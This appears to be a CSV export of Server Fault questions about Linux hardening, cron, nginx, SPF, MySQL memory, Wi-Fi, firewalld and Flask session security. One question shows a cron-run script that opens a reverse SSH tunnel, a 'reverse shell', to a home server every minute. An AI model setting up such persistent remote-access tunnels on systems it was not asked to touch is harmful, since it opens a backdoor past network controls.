<li>Update SSH config - Disable root login [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""http://www.techrepublic.com/article/how-to-harden-ubuntu-server-16-04-security-in-five-steps/"" rel=""noreferrer"">5</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>, <a href=""https://support.rackspace.com/how-to/linux-server-security-best-practices/"" rel=""noreferrer"">8</a>, <a href=""https://support.asperasoft.com/hc/en-us/articles/221494788-Best-practices-for-SSH-configuration"" rel=""noreferrer"">9</a>]</li>
<li>Update SSH config - Change ssh port [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>, <a href=""https://support.rackspace.com/how-to/linux-server-security-best-practices/"" rel=""noreferrer"">8</a>, <a href=""https://support.asperasoft.com/hc/en-us/articles/221494788-Best-practices-for-SSH-configuration"" rel=""noreferrer"">9</a>]</li>
<li>Unattented upgrades [<a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://github.com/MartynKeigher/ghost-on-digitalocean-512MB"" rel=""noreferrer"">4</a>, <a href=""http://www.zartl.info/?p=422"" rel=""noreferrer"">6</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>]</li>
<li>Postfix for emails [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""http://www.zartl.info/?p=422"" rel=""noreferrer"">6</a>]</li>
<li>Logswatch to send daily summary emails [<a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>]</li>
<li>Fail2ban [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>]</li>
<li>Set the timezone to UTC and install NTP [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>]</li>
<li>Secure shared memory [<a href=""http://www.techrepublic.com/article/how-to-harden-ubuntu-server-16-04-security-in-five-steps/"" rel=""noreferrer"">5</a>]</li>
<li>Add a security login banner [[<a href=""http://www.techrepublic.com/article/how-to-harden-ubuntu-server-16-04-security-in-five-steps/"" rel=""noreferrer"">5</a>]</li>
<li>Harden the networking layer [<a href=""http://www.techrepublic.com/article/how-to-harden-ubuntu-server-16-04-security-in-five-steps/"" rel=""noreferrer"">5</a>]</li>
<li>Prevent IP spoofing [<a href=""http://www.techrepublic.com/article/how-to-harden-ubuntu-server-16-04-security-in-five-steps/"" rel=""noreferrer"">5</a>]</li>
</ol>

<p><strong>Sources</strong></p>

<p><a href=""https://www.digitalocean.com/community/tutorials/7-security-measures-to-protect-your-servers"" rel=""noreferrer"">1. Digital Ocean - 7 Security Measures to Protect your Servers</a></p>

<p><a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2. Digital Ocean - What do you do with your first five minutes on a new server</a></p>

<p><a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3. Securing a Server with Ansible</a></p>

<p><a href=""https://github.com/MartynKeigher/ghost-on-digitalocean-512MB"" rel=""noreferrer"">4. Ghost on Digitalocean 512MB</a></p>

<p><a href=""http://www.techrepublic.com/article/how-to-harden-ubuntu-server-16-04-security-in-five-steps/"" rel=""noreferrer"">5. Tech Republic - How to harden ubuntu server 16-04 security in five step</a></p>

<p><a href=""http://www.zartl.info/?p=422"" rel=""noreferrer"">6. How to configure Auto-Updates on Linux Ubuntu Servers</a></p>

<p><a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7. Linode - Securing your Server</a></p>

<p><a href=""https://support.rackspace.com/how-to/linux-server-security-best-practices/"" rel=""noreferrer"">8. Rackspace - Linux Server Security Best Practices</a></p>

<p><a href=""https://support.asperasoft.com/hc/en-us/articles/221494788-Best-practices-for-SSH-configuration"" rel=""noreferrer"">9. Best practices for SSH configuration</a></p>

<p>If this is not the best place to ask this, where is?</p>
","<ubuntu><security>","2017-05-15 21:58:01"
"974659","How can I (as a user) check if AP isolation is enabled for a Wi-Fi network?","<p>I suspect AP isolation is enabled on the Wi-Fi network at my workplace as I can't cast my phone screen to another device that supports Miracast.</p>

<p>Casting works just fine on my home network with the same devices connected to my home Wi-Fi.</p>

<p>How can I, as a user with no access to the router configuration know whether or not AP isolation is enabled for any Wi-Fi network? Is it even possible?</p>
","<wifi><access-point><mirroring><isolated-network>","2019-07-10 10:16:20"
"974675","Connection to server blocked for no reason","<p>I have had a VPS in NL for the past 5-6 years and it's been working great. Now one day I suddenly can't access/ping/anything the VPS from my home connection (tried different computers)</p>

<p>The confusing part is that accessing the server works great when I go directly to the sites I have hosted on it (because they are behind Cloudflare's CDN proxy) or when I try to access the server at work it works good too.</p>

<p>The question is how the heck do I figure out if its my home connection/ISP/router blocking the connection to the VPS or if its the VPS company/software blocking connections FROM my home connection?</p>

<p>Is there any skilled sysadmins out there that can guide me here? I am currently really confused as to where the problem lies.</p>
","<ubuntu><networking><vps><connection><internet>","2019-07-10 12:13:25"
"850374","How to install git on RHEL6.7","<p>I'm trying to install Git on a RHEL6.7 distributor ID:Santiago development server, But after using yum install git, it is showing error</p>

<blockquote>
  <p>Error Downloading Packages:
    1:perl-Error-0.17015-4.el6.noarch: failure: Packages/perl-Error-0.17015-4.el6.                                                                                                                     noarch.rpm from SERVER: [Errno 256] No more mirrors to try.
    git-1.7.1-3.el6_4.1.x86_64: failure: Packages/git-1.7.1-3.el6_4.1.x86_64.rpm f                                                                                                                     rom SERVER: [Errno 256] No more mirrors to try.
    perl-Git-1.7.1-3.el6_4.1.noarch: failure: Packages/perl-Git-1.7.1-3.el6_4.1.no  </p>
</blockquote>
","<redhat><git>","2017-05-16 10:09:18"
"1047666","Scheduled reboot with crontab didn't go ahead. Why might this be?","<p><strong>Information</strong></p>
<p>I have the following crontab for the root user on Debian 10.</p>
<pre><code>root@debian:~# crontab -l
# crontab comments curtailed for serverfault
#
# m h  dom mon dow   command

30 3 * * * shutdown -r now
</code></pre>
<p>If I run <code>uptime</code> and <code>who -b</code> I get the results of the last time I did a manual reboot (yesterday around 6pm).</p>
<pre><code>root@debian:~# uptime
 11:03:19 up 16:29,  1 user,  load average: 0.00, 0.01, 0.00
root@debian:~# who -b
         system boot  2020-12-26 18:34
</code></pre>
<p>I created the crontab around 7pm yesterday, so it was definitely in place prior to the target time.</p>
<p><strong>Question</strong></p>
<p>Is there a reason why this may not have worked? Can I debug this in any way?</p>
","<linux><cron>","2020-12-27 11:07:10"
"924228","reverse ssh using systemd-cron is not connecting","<p>I have a script that checks my home rpi2 for a file using ssh, pk auth, if the file exists it deletes it (again ssh pk auth) and opens a reverse ssh with:<br>
<code>ssh -fN -R xxxx:localhost:22 user@myhomepiserver.com</code></p>

<p>when running the script from the command line it works well i get the reverse shell.</p>

<p>When running from systemd-cron, i don't get the process up!
checking with <code>ps -efwww|grep ""ssh -f""|grep -v grep</code></p>

<p>the crontab is simply:
<code>*/1 * * * * /home/me/my_r_ssh_script.sh</code></p>

<p>I verified that:</p>

<ol>
<li>happens on both arch arm and arch x86 with systemd-cron installed.</li>
<li>does not happen on ubuntu with crontab installed.</li>
</ol>

<p>BTW, i have verified that the script runs as use 'me' and indeed it does do i'm sure it uses the right key, also i tried logging  g with -vvv and what i saw was that unlike from command line seems like the remote does not answer when i run from cron OR maybe the answer doesn't get to the client for some reason, not sure why.</p>

<p>Any help\hint is appreciated!</p>
","<ssh><cron><systemd><arch-linux>","2018-07-31 08:14:42"
"924231","Nginx show 404 if URL end with extension ( ttf | mp3 | mp4 | webm | ogg | jpg | jpeg | gif | ico | css | js )","<p>Issue with Nginx Url rewrite , it show's <code>404</code> if <code>URl's</code> end on any of these</p>

<pre><code> ( ttf | mp3 | mp4 | webm | ogg | jpg | jpeg | gif | ico | css | js )
</code></pre>

<p><strong>Example URL</strong> .</p>

<pre><code>example.com/convert-to-ttf
example.com/convert-to-jpeg
example.com/convert-to-jpg
example.com/convert-to-mp4
</code></pre>

<p>but if if add / in end of URL then it works . anyone know what is the issue </p>
","<nginx><rewrite>","2018-07-31 08:25:52"
"747514","Add a second IP to SPF record, from an external SMTP server","<p>I would like to add the IP of an external SMTP server to an existing SPF record, which is looks like this: </p>

<pre><code>""v=spf1 a mx ip4:185.6.139.6 a:frey.mailpool.1.netmask.hu a:frey.mailpool.2.netmask.hu a:frey.mailpool.3.netmask.hu ~all""
</code></pre>

<p>Isn't will it mess up the parts with the ""a:frey....."" syntaxes, while the current and the new IP belongs to different servers? This would be the most simple way, but it looks too easy:</p>

<pre><code>""v=spf1 a mx ip4:91.82.220.135 ip4:185.6.139.6 a:frey.mailpool.1.netmask.hu a:frey.mailpool.2.netmask.hu a:frey.mailpool.3.netmask.hu ~all"" 
</code></pre>

<p>Thank you</p>
","<smtp><spam><spf>","2016-01-07 23:15:32"
"975114","Is the length of ethernet frame fixed between different media?","<p>According to wikipedia, ethernet frame is 1522 bytes long.  However, in wireshark's wiki, it seems it is not always true:  </p>

<blockquote>
  <p>As the Ethernet hardware filters the preamble, it is not given to Wireshark or any other application. Most Ethernet interfaces also either don't supply the FCS to Wireshark or other applications, or aren't configured by their driver to do so; therefore, Wireshark will typically only be given the green fields, although on some platforms, with some interfaces, the FCS will be supplied on incoming packets.  </p>
</blockquote>

<p><strong>Questions:</strong><br>
1. Is the length of ethernet fixed between all hardware?<br>
2. How to know the length of ethernet frames in linux?</p>
","<linux><networking><ethernet>","2019-07-13 07:46:22"
"747654","Branch Office Server vs VPN","<p>Historically our branch offices have had their own servers to do DNS, Active Directory and a few other services. But the number of people working out of our branch office has shrunk to about 4 people.</p>

<p>From head office we provide VPN access to all our remote users. I am proposing that instead of providing a server (and maintaining it) each user in this office instead uses VPN.</p>

<p>Email, File and Database access will be provided by head office in either configuration.</p>

<p>My question is how many users can work in the branch office before it becomes unworkable and I would need a server with site to site VPN?</p>
","<vpn><network-design>","2016-01-08 14:43:56"
"747696","Google Cloud SQL - Stopping / Deleting A Backup","<p>How would I stop a running backup on Google Cloud SQL or delete one of the other backups? The backup has been running for over 12 hours and the instance is not accessible at all due to this.</p>

<p><code>$ gcloud sql backups list -i mysql</code></p>

<pre><code>2016-01-08T00:00:00.138000+00:00  -      RUNNING &lt;&lt;-- 12h+
2016-01-07T00:00:00.376000+00:00  -      SUCCESSFUL
2016-01-06T00:00:00.713000+00:00  -      SUCCESSFUL
2016-01-05T00:00:00.943000+00:00  -      SUCCESSFUL
2016-01-04T00:00:00.249000+00:00  -      SUCCESSFUL
2016-01-03T00:00:00.575000+00:00  -      SUCCESSFUL
2016-01-02T00:00:00.015000+00:00  -      SUCCESSFUL
2016-01-01T00:00:00.257000+00:00  -      SUCCESSFUL
2015-12-31T00:00:00.890000+00:00  -      DELETED
2015-12-30T00:00:00.254000+00:00  -      DELETED
2015-12-29T00:00:00.372000+00:00  -      DELETED
</code></pre>

<p>The instance ran out of space and the backup obviously can't complete until space is freed up, so I need to free up some space first by removing a backup, then once I can actually access the instance can I free up some table space and increase the disk size.</p>
","<google-cloud-platform><google-cloud-sql>","2016-01-08 16:42:43"
"924487","What is tomcat7 exin doing?","<p>When checking via <code>top</code> I see two processes for tomcat7:</p>

<pre><code>  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                                                                      
15163 tomcat7   20   0 2082064 317976  20816 S 55.4  7.8   0:54.49 java                                                                                         
  964 tomcat7   20   0  194332   5740   1404 S 18.9  0.1 284:09.36 exin
</code></pre>

<p>I wonder what exin is doing, why it consumes so much CPU power and why it is running for such a long time?</p>

<p>Searching for ""tomcat7 exin"" in Google revealed nothing. This is why I am asking here.     </p>
","<tomcat7>","2018-08-01 16:45:03"
"924555","Can i check when the domain admin last looked at my desktop folder, or a specific file on my desktop?","<p>I have left a sensitive file on my windows 10 desktop folder. The windows 10 instance is connected to a domain. I understand that the domain admin has full access to my desktop.</p>

<p>Is their a way for a low privileged use (me) to see when the domain admin last opened my desktop folder?
Or any other information that could help me to check if the file on my desktop has been accessed without asking the domain admin?</p>

<p>Thankyou</p>
","<windows><active-directory><domain>","2018-08-02 06:44:47"
"975293","S3 bucket back-up NOT on AWS","<p>I'm looking for a service to back-up s3 buckets that isn't hosted on Amazon so that there is complete separation but there doesn't seem to be much.</p>

<p>It's for periodic (daily) back-up of &lt; 500GB</p>

<p>Maybe just scripting to Azure or google cloud? </p>

<p>Or any suggestions for a service in the EU?</p>
","<amazon-web-services>","2019-07-15 10:29:30"
"747832","Setup scalable email server","<p>I spent last week setting up email servers with trying all MTA and I was able to send and receive emails with attachments and do spam filtering.</p>

<p>Now my concern is what if I got too many users and too many domains with emails that have attachments. By time servers' quota would be used and there will be no space.</p>

<p>My question is, how to setup dynamic servers to serve emails? I want it to be flexible like I will add multiple domains and users and I can't give each domain it's own server because they may add later more users. Simply, I want to setup a service that scale.</p>

<p>To be clearer, I want to make a service like Google Apps and Zoho Mail.</p>
","<email><postfix><email-server><sendmail><dovecot>","2016-01-09 09:33:40"
"924617","What is the Industry Best Practice for Updating Dell Drivers ?","<p>Is it ok to upgrade to latest drivers whenever we provide it to end-user ? or we should keep the Drivers with OS which has been shipped by Dell along with OS</p>

<p>Kindly suggest if there is any document or blog from Dell about it as well</p>
","<dell><drivers><best-practices>","2018-08-02 13:07:02"
"975350","How to protect against session hijacking in Flask","<p>So, i'm developing a Flask web-app and i wanted to test its security since i've implemented the following:</p>

<ul>
<li>SSL Cert with cookies being securely transmitted</li>
<li>CSRF token to avoid CSRF attacks</li>
<li>Cookie validation, to avoid cookie modification</li>
<li>Cookie are httpOnly to avoid XSS</li>
</ul>

<p>Now, in a hypothetical case in which one of my users got tricked to reveal his cookies to a malicious user, and if this user injects those session cookies to his own browser, that results on the web-app admitting the malicious user allowing him to enter the session.</p>

<p>I tested it with chrome and an incognito window (on the same computer), and I could hijack the session. Is there a way to prevent this? as I understand, Facebook has succesfully protected against cookie injection, but not sure about it.</p>
","<security><python><flask><cookie><http-cookie>","2019-07-15 19:22:10"
"747915","Retrieve host info from a VM","<p>I know we are able to know if we are in a virtual machine. But i'm wondering if we can gether informations about host from a vm (ip, mac, os, ...).
Another question: if we do an http request from the vm, is the web site able to get information about host or the host hardware  ( mac address, ..) ?</p>
","<virtual-machines><hypervisor>","2016-01-09 20:52:19"
"747927","best configuration for database server","<p>Okay I have a VPS (DO 512 MB) and AWS RDS free tier . I wanna get the maximum performance , please help me cause I'm a little confused .
I run a nginx server on the VPS and it can handle 1K traffic/Sec without much panic . 
My problem is do I host the MySQL on the VPS or on AWS ? You migh say benchmark it , right !? I did , and here's the results (i have a pretty small database 500 Row , 15 columns )
i tested query executing time from my local location connecting to both of the servers . 
i ran a big query to test them 4 times to be 100% sure of results ,both servers are optimized using the same parameters . </p>

<p>AWS -RDS - MYSQL </p>

<ul>
<li>1st time :2.97</li>
<li>2nd time :2.88</li>
<li>3rd time :1.61 4th</li>
<li>4rd time :3.19</li>
</ul>

<p>VPS - MYSQL</p>

<ul>
<li>1st time :1.88 </li>
<li>2nd time :1.81  </li>
<li>3rd time :2.14</li>
<li>4th time :1.88</li>
</ul>

<p>i get even faster VPS results executing queries Locally( on the VPS).
and i got php+mysql test with Loader.io and here's the results too . 
<a href=""https://i.sstatic.net/u6MGq.jpg"" rel=""nofollow noreferrer"">VPS loader.io TEST</a>
<a href=""https://i.sstatic.net/bFYxu.jpg"" rel=""nofollow noreferrer"">AWS loader.io TEST</a>
Even though the VPS mysql is faster in all ways but it uses a lot of system resources (5.7% MEM X 6 Process) . 
is the speed difference worth the resources eaten from the VPS?
any recommendation . </p>
","<mysql><amazon-web-services><vps><database>","2016-01-09 22:37:46"
"975411","Why can not I connect to Webmin on my AWS centOS server?","<p>I have a centOS server on AWS and I can not connect to Webmin.
I followed the installation steps that (shows this page), but when I click on the link that is generated after completing the installation of Webmin, the following error appears:
This website can not be accessed The IP address of the server xxxxxxxxxxx could not be found.
DNS_PROBE_FINISHED_NXDOMAIN
I have read <a href=""https://serverfault.com/questions/354794/webmin-not-responding-on-centos"">other responses:</a> ()</p>

<p>I have searched for a solution by Google for three days without success.
On the server I have enabled ports 10000, 22, 21, 20
I do not know what else I can do or where to go.
I may not show you enough details of my problem so you can help me, but it's the first time on this site that I read the rules.
If I have to add more details, please tell me what I can do so they can help me.
I also use a translator to ask the question, which can cause errors.
Can you help me connect Webmin to my server?
Thank you</p>
","<amazon-web-services><centos7><webmin>","2019-07-16 10:12:29"
"747950","Cannot connect to local IRC server","<p>I have been working on to create a local IRC server. The problem is i cannot connect to the IRC server from a different machine, although i can access it from the local host from the server. </p>

<p>When it try to use it from another machine (I use mIRC, typed /server [IP] ), it always says ""Unable to connect to server""</p>

<p>What am I missing here? I am using UnrealIRC 3.2.10.6 on CentOS 7</p>

<p>Here is the pastebin of the unrealircd.conf file <a href=""http://pastebin.com/Uuj81ija"" rel=""nofollow noreferrer"">http://pastebin.com/Uuj81ija</a></p>
","<irc>","2016-01-10 03:20:32"
"975514","How to download file from url and store it in aws s3 bucket?","<p>As stated, I'm trying to download this dataset of zip folders containing images: <a href=""https://data.broadinstitute.org/bbbc/BBBC006/"" rel=""nofollow noreferrer"">https://data.broadinstitute.org/bbbc/BBBC006/</a> and store them in an s3 bucket so I can later unzip them in the bucket, reorganize them, and pull them in smaller chunks into a vm for some computation. Problem is, I don't know how to get the data from <a href=""https://data.broadinstitute.org/bbbc/BBBC006/BBBC006_v1_images_z_00.zip"" rel=""nofollow noreferrer"">https://data.broadinstitute.org/bbbc/BBBC006/BBBC006_v1_images_z_00.zip</a> for example or any of the other ones, to then send it s3 this is my first time using aws or really any cloud platform so please bear with me :]</p>
","<amazon-web-services><url><zip>","2019-07-17 00:01:55"
"924782","How to debug Chrome SSL issue","<p>I have a site secured with SSL. It's a single page application. The application communicates with a back-end REST service using mostly POST operations.</p>

<p>The application loads perfectly fine but calling the back-end REST service fails. Using the security tab in Chrome's developer tools shows that the SSL cert is perfectly valid.</p>

<p>If I try to run the application in IE it works perfectly fine (i.e. the REST API calls work fine) but it just doesn't work in Chrome. If I switch off Require SSL the application works perfectly fine (but obviously not securely).</p>

<p>If I try to perform a GET on the back-end service by typing the URL directly into the browser this works fine in Chrome, so it's just POST operations that aren't working. </p>

<p>I'm scratching my head as to how to debug this. Is there another, lower-level tool I can use to discover what is going on?</p>

<p>There is no actual error code showing for the requests in the network tab in Chrome - just 0() on the console. This would seem to indicate that the back-end just isn't returning anything.</p>
","<ssl><google-chrome>","2018-08-03 09:56:14"
"924861","HP G8 server and disks","<p>I'm looking to get an HP G8 server to create a ZFS based file server solution.</p>

<p>One of the things that I read is that starting with G8, HP Changed their caddies, and it now performs disks check to make sure the disks are branded as HP. If not, they'll appear as degraded.</p>

<p>Since I don't care so much about HP disks (I prefer to save the money and buy 3rd party disks, after all, it's for my home lab use), so I would like to ask:</p>

<ul>
<li>If I'll connect the backplane to another LSI/AVAGO RAID card - will the disks work?</li>
<li>Will I get all the <em>correct</em> status from the disks on the OS level? (I'll be using Linux)</li>
</ul>

<p>Thanks</p>
","<raid><hard-drive><hp>","2018-08-03 17:38:08"
"748491","Microsoft Exchange, which alternatives?","<p>is there anyone who knows (or has had experience) with alternatives to Microsoft Exchange?</p>

<p>I'm looking for a solution more cheaper (or free) that can be installed on Windows servers.</p>

<p>Ideally, an open source mail servers that also exposes Services/API to interface by code, in order to develop appropriate software for querying mail and loading contacts.</p>

<p>Can you tell me some product to view?</p>

<p>Thank you in advance for any useful information about.</p>
","<windows><email><exchange><open-source>","2016-01-12 14:11:12"
"850510","Router Wi-Fi not working after power failure","<p>I know this sounds lame, but it's the second consumer router in as many months which has Wi-Fi issues after power failures. My electric utility company sent notices this morning that they were working on the power grid, and that we'll have outages today (this is my home). I unplugged the NAS and the computer, but didn't think to unplug the router. When I came back from work I found the router powered on, but my phone and laptop failed connecting to the WLAN (""invalid password""). The LAN works fine (I'm writing this using the desktop at home). I powered off the router completely for 30 minutes or so – no joy. I stopped and started the Wi-Fi (both 2.4 GHz and 5 GHz) – no joy. I changed the Wi-Fi passwords... you get the drift.</p>

<p>The first router that was borked this way was a NetGear; this one is a TP-Link. Both are consumer grade. What do you suggest?</p>
","<router><netgear><tp-link>","2017-05-16 18:58:39"
"748590","Windows 10 domain login (auth) to local account","<p>I was a bit unsure how to phrase the title to this question so apologies for any confusion.</p>

<p>This is a lab environment (higher ed) with ~300 machines. We are upgrading our image to Windows 10 this summer but we need to address login and user-profile creation. What we want to do is authenticate users (using AD), but not use roaming profiles or have to wait for profile creation every time they log in. Keeping individual profiles on the machine is not an option. With our GPOs and other issues, logging into a domain account that needs created can take 2-5 minutes. We need students to be able to hit a desktop in under 30 seconds.</p>

<p>In the past we have used pGina to alter the login account once a user is authenticated. We maintain 2 local machine profiles (one for students, one for the public) and after authentication occurs we shunt the user into the proper local profile. This has worked pretty well for the past couple years. We get authentication, we get logging/auditing from the DC, no buildup of profiles, and fast login. However, pGina development has slowed or halted and currently does not work in Windows 10 with not word on when or if it will. </p>

<p>We are open to all suggestions - even commercial software if such exists. I cannot seem to find anyone else who has met this challenge, although it is inherently difficult to search for as all the related keywords bring up vastly different scenarios and problems. </p>

<p>Now I know what we <em>really</em> need is VDI or some virtualization tech most likely, but that requires more cooperation from the overall IT organization than we are likely to get in time to roll out a new image over the summer. So although I am open to all suggestions, even commercial ones, we are pretty limited to the environment and ecosystem we already have.</p>
","<windows><domain><login><profile>","2016-01-12 19:58:25"
"1047734","Spams accessing the server","<p>I opened a small website through port forwarding to allow anyone to access my site. I didn't even post the address of this site, but some people from other countries(found out through the IP) were accessing my site. How do they know my address and what can they do in my site?</p>
","<security>","2020-12-28 00:43:38"
"748604","How to remote everything ( KVM like switch eg. VGA, usb Mouse and usb keyboard) over network / wifi","<p>Does anyone know how i can forward mouse, keyboard and vga data over the web? So i can remotely control pc's like on a KVM switch?</p>

<p>The only thing is, a KVM switch requires you to have a physical presence there. Whereas my intention is only to setup the requirements ( add mouse, keyboard and vga to a kvm switch). Then the KVM switch is connected to the web and i can control both the pc's through a web interface ( or something similar).</p>
","<networking><wifi><web><usb><keyboard-video-mouse>","2016-01-12 20:48:12"
"748623","nginx / ssl: Always redirect to one of two https subdomains","<p>My webserver supports the following two subdomains:</p>

<ul>
<li><a href=""https://www.example.com"" rel=""nofollow noreferrer"">https://www.example.com</a></li>
<li><a href=""https://en.example.com"" rel=""nofollow noreferrer"">https://en.example.com</a></li>
</ul>

<p>I want to create my nginx config so that:</p>

<ol>
<li><a href=""http://en.example.com"" rel=""nofollow noreferrer"">http://en.example.com</a>$request_uri => <a href=""https://en.example.com"" rel=""nofollow noreferrer"">https://en.example.com</a>$request_uri</li>
<li><a href=""http://www.example.com"" rel=""nofollow noreferrer"">http://www.example.com</a>$request_uri => <a href=""https://www.example.com"" rel=""nofollow noreferrer"">https://www.example.com</a>$request_uri</li>
<li>Every other subdomain independent of http or https => <a href=""https://www.example.com"" rel=""nofollow noreferrer"">https://www.example.com</a>$request_uri</li>
</ol>

<p>I could not find any solution online that solves this problem. Can anybody help me out with the correct nginx config.</p>
","<nginx><ssl><subdomain>","2016-01-12 21:46:06"
"748700","How to know status of time of daemon/service stopped on linux server?","<p>How to know time or date of daemon/service stopped on linux server?</p>
","<linux><service>","2016-01-13 06:06:58"
"925120","Centos 7 / MariaDB, 1gig DigitalOcean Droplet high traffic kills MySQL","<p>I have a Centos 7 / MariaDB, 1gig DigitalOcean Droplet with 2 low traffic Wordpress sites on. When the server gets approx 15 concurrent users MySQL runs out of memory and drops. Log below:</p>

<pre><code>180806 14:43:05 InnoDB: Fatal error: cannot allocate memory for the 
buffer pool
180806 14:43:05 [ERROR] Plugin 'InnoDB' init function returned error.
180806 14:43:05 [ERROR] Plugin 'InnoDB' registration as a STORAGE ENGINE failed.
180806 14:43:05 [Note] Plugin 'FEEDBACK' is disabled.
180806 14:43:05 [ERROR] Unknown/unsupported storage engine: InnoDB
180806 14:43:05 [ERROR] Aborting

180806 14:43:05 [Note] /usr/libexec/mysqld: Shutdown complete
</code></pre>

<p>So my question here is, what can i do to stop MySQL from dropping, Apache stays up fine. So hoping some handy configuration tweaks will resolve this for me :)</p>

<p>Cheers all!</p>
","<mysql><centos7><mariadb><digital-ocean>","2018-08-06 14:46:19"
"748711","Is MySQL using up all the memory?","<p>I need help with reading this output of <code>free -m</code>. This server has a total of 32 GB of ram but it shows <code>9383</code> used and <code>290</code> free. The rest seems to be in the <code>buff/cache</code>. I am running mysql on this server and we get high CPU usage from time to time intermittently. I was wondering if this had to do with all the memory being used up and it's swapping or possibly a MySQL configuration issue?</p>

<p>Does buff/cache mean the 22GB of RAM is free or used up? Only thing running on this server is MySQL and we do get tons of queries a day. Approximately 6 million queries per hour.</p>

<pre><code>              total        used        free      shared  buff/cache   available
Mem:          31876        9383         290         216       22203       21840
Swap:         16383        1541       14842
</code></pre>
","<memory-usage><mariadb><mysql5.5>","2016-01-13 07:08:02"
"748800","How to change/disable SSH message on connect?","<p>I have a Linux server with <code>SSH</code> service on it. If I performing a <code>TCP</code> connection to it (e.g. <code>telnet %ip% %port%</code>), it sends me a version line, like <code>SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3</code>. It is not a <code>banner</code>! (Banner sent after successful authentication).<br>
So, my question: it is possible to disable this message or change it?<br>
Without recompiling from source code...</p>
","<ssh>","2016-01-13 12:57:30"
"748802","Bit copied a disk image using the dd command to a new and bigger disk. How do expand whole LVM?","<p>I just copied a 50 GB disk image using dd for bit copying to a new harddisk with 200 GB storage. On the disk is LVM including the system partition EXT4 and a swap partition (both LVs).</p>

<p>Well the copy is running and works great. Now I would like to expand the whole LVM VG, and LV and also the underlying EXT4 to use the whole disk.</p>

<p>At the moment it still claims to have 50 GB only. I would like to extend it not at a second disk to the Volume Group. What would be the best way to do it?</p>
","<linux><hard-drive><lvm><partition><ext4>","2016-01-13 13:02:13"
"850779","Restoring permissions after a virus removal","<p>Recently I've noticed some suspicious activity on the server and removed a virus (from what I gathered it was MPK). I caught it on time and it didn't do any damage.
One of the things that it did is messed up permissions and now I can't start ESET service or run malwarebytes or KAV...
I understand that it somehow messed up security permissions (I think files and regs).
As a result I can't use sfc or dism to fix problems.</p>

<p>Is there a way to restore permissions?</p>
","<windows-server-2012-r2>","2017-05-17 20:14:56"
"1047996","Domain and subdomains with nginx from the same server","<p>More dev than ops here. Situation: I have a home server (fedora) running a few applications using podman. Some are database services and use various ports. Can this work in NGINX?</p>
<ul>
<li>host personal site through <code>domain.dev</code>. It lives on <code>localhost:8080</code>.</li>
<li>host the Fedora cockpit through <code>cocking.domain.dev</code>. It lives on <code>localhost:9090</code>.</li>
<li>host the other applications through sub domains of their own, with their various ports <code>db.domain.dev:30001</code> which live on <code>localhost:30001</code>. I think I have 15 ports used all in all.</li>
</ul>
<p>Cockpit I think I can do (it uses websockets)</p>
<pre><code>map $http_upgrade $connection_upgrade {
  default upgrade;
  '' close;
}
upstream websocket {
  server localhost:9090;
}
server {
  server_name cockpit.domain.dev;
  location / {
    proxy_pass http://websocket;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection $connection_upgrade;
    proxy_set_header Origin https://$host;
  }
}
</code></pre>
<p>Can I simply add another <code>location /</code> for domain <code>domain.dev</code>?</p>
<p>I can open my modem to pass on all the required ports. If possible, I have a follow-up question later about certbot, google domains and google dns. I <em>cannot</em> get that to work.</p>
","<nginx>","2020-12-30 00:23:38"
"850864","Is it possible to disable ssh password authentication for own user without root access?","<p>I would like to disable ssh password authentication for my user account on a server where I don't have root priviledges, so that I can only log in via publickey authentication. </p>

<p>Everything I found on the topic involved changing <code>/etc/ssh/sshd_config</code>, which I can't do obviously. </p>

<p>Is this possible at all?</p>

<p>I found <a href=""https://serverfault.com/a/387130/205986"">this</a> answer to a similar question, but it's not clear to me whether it does what I want without side effects. And whether I can do it without <code>sudo</code>.</p>
","<ssh><debian><public-key>","2017-05-18 10:22:19"
"748954","Firewalld not opening port 25?","<p>Lookst like firewalld is not opening port 25. I tried adding the smtp service, and port 25 separately as well, yet, I am unable to telnet to the server. 
Any tips?</p>

<pre><code>[root@host ~]# firewall-cmd --zone=public --list-all
public (default, active)
  interfaces: eth0
  sources:
  services: dhcpv6-client http https smtp ssh
  ports: 3762/tcp 25/tcp 7683/tcp 4424/tcp
  masquerade: no
  forward-ports:
  icmp-blocks:
  rich rules:

[root@host ~]# nmap XXXXXXXMYIP

Starting Nmap 6.40 ( http://nmap.org ) at 2016-01-14 00:11 CET
Nmap scan report for CentOS-72-64-minimal (XXXMYIP)
Host is up (0.0000080s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
110/tcp   open  pop3
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
